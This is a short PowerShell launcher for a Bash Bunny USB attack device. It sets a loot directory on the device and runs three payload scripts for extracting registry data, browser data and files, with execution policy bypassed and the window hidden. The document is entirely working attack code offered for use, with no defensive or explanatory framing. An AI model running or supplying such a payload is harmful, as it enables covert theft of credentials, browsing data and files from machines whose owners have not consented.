#Set the loot directory for bash bunny
$dir = (Get-Volume -FileSystemLabel BashBunny).DriveLetter + ':\payloads\switch2'

Powershell -nop -ex Bypass -w Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\switch2\Registry-Extraction.ps1')"
Powershell -nop -ex Bypass -w Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\switch2\Browser-Extraction.ps1')"
Powershell -nop -ex Bypass -w Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\switch2\File-Extraction.ps1')"
